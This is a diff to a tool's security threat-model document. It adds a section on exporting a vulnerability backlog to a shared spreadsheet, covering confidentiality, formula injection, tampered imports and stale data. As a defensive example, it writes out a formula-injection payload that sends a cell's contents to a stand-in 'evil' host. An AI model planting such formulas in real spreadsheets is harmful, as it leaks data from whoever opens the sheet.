@@ -24,6 +24,7 @@
   - [4.6 Auto-Posting and Reputation](#46-auto-posting-and-reputation)
   - [4.7 Supply Chain](#47-supply-chain)
   - [4.8 Telemetry](#48-telemetry)
+  - [4.9 Sharing the Backlog for Outside Review](#49-sharing-the-backlog-for-outside-review)
 - [5. Remote CI Trust](#5-remote-ci-trust)
   - [5.1 The Appeal](#51-the-appeal)
   - [5.2 Why It Is Not Safe to Trust PR-branch CI By Default](#52-why-it-is-not-safe-to-trust-pr-branch-ci-by-default)
@@ -349,6 +350,96 @@ telemetry endpoint itself is a future attack surface.
 - The "check if endpoint is alive before sending" pattern means a compromised DNS entry could
   redirect telemetry to an attacker-controlled server. Use certificate pinning or HSTS-like
   validation when the endpoint goes live.
+
+---
+
+### 4.9 Sharing the Backlog for Outside Review
+
+**What happens:** `security/sheet_sync.py` exports the security backlog as a CSV, which the
+operator puts into a shared spreadsheet (Google Sheets or anything else) so that people who
+are not the operator — on an ASF project, the PMC — can read and rule on reports. Their edits
+come back through `import_security_csv` or the dashboard's upload form.
+
+This is the only feature in the security path that deliberately moves report data off the
+operator's machine. It is worth being clear-eyed about that.
+
+**Risk:**
+
+- **Confidentiality.** An unfixed vulnerability report in a Google Sheet is an unfixed
+  vulnerability report in Google's infrastructure, under whatever ACL the operator set — and
+  a link-shared sheet is world-readable to anyone who gets the link. The `--full` export makes
+  this much sharper: it includes the raw report text and the proposed patch, i.e. a working
+  description of how to exploit the bug and where the fix goes.
+- **Spreadsheet formula injection.** Report titles, reporter names and scanner output are
+  supplied by whoever filed the report. A title of `=HYPERLINK("https://evil/"&A2,"click")`
+  or `@SUM(...)` becomes a *live formula* when the CSV is opened, executing in the browser
+  session of every PMC member who opens the sheet — data exfiltration via a document the
+  operator vouched for.
+- **Write-back as an injection path.** The import writes `status`, `assessed_severity`,
+  `matched_cve_id` and two notes fields. A tampered CSV could mark real findings invalid, or
+  land text in `external_notes`, which is displayed on the report page.
+- **Stale-sheet data loss.** Not an attack, but the likeliest real-world harm: a sheet
+  exported a week ago carries week-old verdicts, and importing it naively reverts every ruling
+  made since.
+
+**Current mitigations:**
+
+- **Nothing is sent anywhere by this code.** There is no Google integration, no API client and
+  no credential. The export writes a file; the operator decides where it goes. That is a
+  deliberate design choice, not an unimplemented feature — see the module docstring.
+- **The default export omits the payload.** `raw_text` and `proposed_patch` are `--full`-only,
+  so the ordinary sheet carries the decision (title, component, severity, triage summary) and
+  not the exploit. The dashboard marks the full-text button differently for the same reason.
+- **Every text cell is escaped** against formula injection: a leading `=`, `+`, `-`, `@`, tab
+  or CR gets an apostrophe prefix, which Sheets and Excel both read as "this is text". Coming
+  back, the import does *not* strip a leading apostrophe — it can't, because a note that
+  genuinely begins with one (`'--force' is not the answer`) is character-for-character
+  identical to an escaped `--force`, and stripping ate the reviewer's quote mark. It compares
+  an incoming cell against both the stored text and the escaped form of it, so an **unedited**
+  cell reads as unchanged and nothing accumulates. The residue is on **edited**
+  formula-leading cells only: if a reviewer appends to a note that starts with `=`, the
+  apostrophe becomes part of the stored text. Accepted as the lesser of the two, and recorded
+  here rather than described as a strip that doesn't exist.
+- **Only five columns are writable.** Everything else round-trips as read-only context; a
+  column absent from the uploaded file is treated as "no instruction", never as "blank the
+  field", so deleting a column cannot wipe it.
+- **Choices are validated, not trusted.** `status` and `severity` must resolve to a real
+  choice; `matched_cve_id` must match a bounded CVE pattern (unbounded, it accepted a
+  209-character "CVE" into a `max_length=50` column, which SQLite stores without complaint
+  and Postgres rejects); `report_id` must be a positive integer inside SQLite's INTEGER range,
+  because a twenty-digit one parses fine in Python and then raises `OverflowError` out of the
+  query — a 500 on an endpoint anyone on the Tailscale net can POST to. C0 control characters,
+  NUL included, are stripped from every imported cell.
+- **A staleness *and row-integrity* guard.** Each row carries a `check` token digesting the
+  writable fields **plus the report id**. If the report changed after the export, the import
+  refuses that row and says so rather than picking a winner; `--force` overrides, per run, and
+  reports every row it forced. Including the id matters: most rows are `new`/`unknown` with no
+  notes, so without it two reports had identical tokens and a sheet whose rows got sorted
+  without their key column would apply one finding's ruling to another, guard satisfied.
+- **A row applied without a usable token says so** — in the summary, not just in a counter.
+  A missing `check` column and a blanked `check` cell both count as unchecked and are reported
+  as applied blind.
+- **`external_notes` is separate from `operator_notes`** and rendered through Django's
+  autoescaping like any other field, so imported text cannot become markup.
+
+**Remaining gaps:**
+
+- The export response sets `Cache-Control: no-store`, but that is the only protection on the
+  downloaded file. Once it is in a Downloads folder or a Drive, it is out of this tool's hands.
+- The confidentiality decision is entirely the operator's, and the tool cannot enforce it. If
+  the sheet is link-shared, the reports are effectively public. This deserves a warning in the
+  operator docs at minimum, and arguably a config gate on the whole feature for projects whose
+  disclosure policy forbids it.
+- Nothing signs or MACs the export, so a CSV can be edited by anyone who can reach it before
+  the operator imports it. The `check` token is a staleness guard, not an integrity guard: it
+  is an unkeyed digest, so anyone can recompute one. Treat an imported CSV as coming from
+  whoever had access to the sheet.
+- No audit trail of *which* import applied a given change. `external_notes_at` records when a
+  comment last changed, but not who wrote it — the sheet has no identity, which is the price
+  of not integrating with Google's auth.
+- Imported `external_notes` is not run through the malicious-prompt guard, so if a future
+  feature feeds it to an LLM (as triage guidance does with operator feedback) it would be an
+  untrusted-input path. It is display-only today.
 
 ---
 
